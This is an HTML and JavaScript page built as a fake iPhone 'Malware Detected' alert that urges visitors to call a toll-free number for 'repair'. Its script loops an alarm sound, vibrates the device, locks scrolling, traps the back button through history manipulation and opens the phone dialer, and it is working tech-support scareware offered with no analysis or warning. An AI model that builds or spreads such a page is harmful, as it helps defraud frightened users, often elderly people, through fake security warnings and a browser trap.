<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="minimal-ui, width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Fullscreen Simulation</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            overflow: hidden; /* Prevent scrolling */
        }

        .fullscreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        #content {
            text-align: center;
        }
    </style>
</head>
<body>

<div id="content" class="fullscreen">
    <h1>Malware Detected</h1>
    <button id="vibrateButton" class="btn btn-danger">Repair iPhone Virus</button>
    <button id="callButton" class="btn btn-danger">Call +1 877 838 1219</button>
</div>

<!-- Audio Element -->
<audio id="audioPlayer" src="assets/media/alert.mp3" loop></audio>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    $(document).ready(function () {
        const audioPlayer = document.getElementById('audioPlayer');
        const vibrateButton = $('#vibrateButton');
        const callButton = $('#callButton');

        // Function to play audio
        function playAudio() {
            audioPlayer.play();
        }

        // Function to simulate fullscreen
        function goFullScreenAndVibrate() {
            // Lock the viewport (simulate fullscreen on iOS)
            document.body.style.height = "100vh";
            document.body.style.overflow = "hidden";  // Prevent scrolling
            window.scrollTo(0, 0);  // Ensure no scrolling

            // Trigger vibration on mobile devices
            if (navigator.vibrate) {
                navigator.vibrate([200, 100, 200]); // Vibration pattern
            }

            // Show audio and fullscreen experience
            playAudio();

            // Add fullscreen class to body
            document.body.classList.add('fullscreen');
        }

        // Trigger fullscreen and audio when user interacts
        function handleUserInteraction() {
            goFullScreenAndVibrate();
        }

        // Trigger fullscreen on first touch or click
        window.addEventListener('touchstart', handleUserInteraction, { once: true });
        window.addEventListener('click', handleUserInteraction, { once: true });

        // Button actions
        vibrateButton.on('click', () => {
            goFullScreenAndVibrate();
        });

        callButton.on('click', () => {
            // Open phone dialer
            window.location.href = "tel:+18778381219";
        });

        // Prevent the backspace key from navigating back.
        history.pushState(null, null, window.location.href);
        history.back();
        window.onpopstate = () => history.forward();
    });
</script>
</body>
</html>
